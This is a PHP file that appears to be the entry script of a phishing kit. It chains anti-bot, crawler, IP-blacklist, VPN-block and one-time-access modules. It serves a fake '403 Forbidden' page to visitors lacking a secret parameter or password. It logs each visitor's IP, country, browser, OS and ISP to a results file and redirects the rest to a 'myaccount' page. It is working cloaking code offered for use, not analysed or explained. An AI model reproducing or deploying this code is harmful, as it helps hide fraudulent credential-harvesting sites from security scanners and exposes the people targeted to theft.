<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
//error_reporting(0);
$timezonedefault = trim(file_get_contents('timezone.ini'));
date_default_timezone_set($timezonedefault);

session_start();
$_SESSION                 = array();
$_SESSION['landing_page'] = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] .  $_SERVER['REQUEST_URI'];

require 'main.php';
require_once 'blocker.php';

if ($block_referrer == "on") {
    require_once 'crawlerdetect.php';
}
if ($block_iprange == "on") {
    require_once 'blacklist.php';
}
if ($onetime == "on") {
    require_once 'onetime.php';
}
if ($block_vpn == "on") {
    require_once 'proxyblock.php';
}
if ($activate_antibot == "on") {
    require_once("antibot.php");
}

if ($site_param_on == "on") {
    $secret = $site_parameter;
    //$password = $_GET[$secret];
    if (!isset($_GET[$secret])) {
        tulis_file("result/total_bot.txt", "$ip|Wrong Site Parameter|$date");
        header('HTTP/1.0 403 Forbidden');
        die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    } else {
        $_SESSION['key'] = $key;
    }
}

if ($site_pass_on == "on") {
    $secret   = md5($ip);
    $password = $_POST[$secret];
    $mypass   = md5($_POST[$secret]);
    if (!isset($password)) {
        tulis_file("result/total_bot.txt", "$ip|Wrong Site Password|$date");
        header('HTTP/1.0 403 Forbidden');
        die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    } else {
        $_SESSION['site_password'] = $site_password;
    }
}

tulis_file("result/total_click.txt", "$date|$ip|$countrycode|$countryname|$br|$os|$ispuser");
$_SESSION['key'] = $key;
header("location: myaccount?key=$key");
?>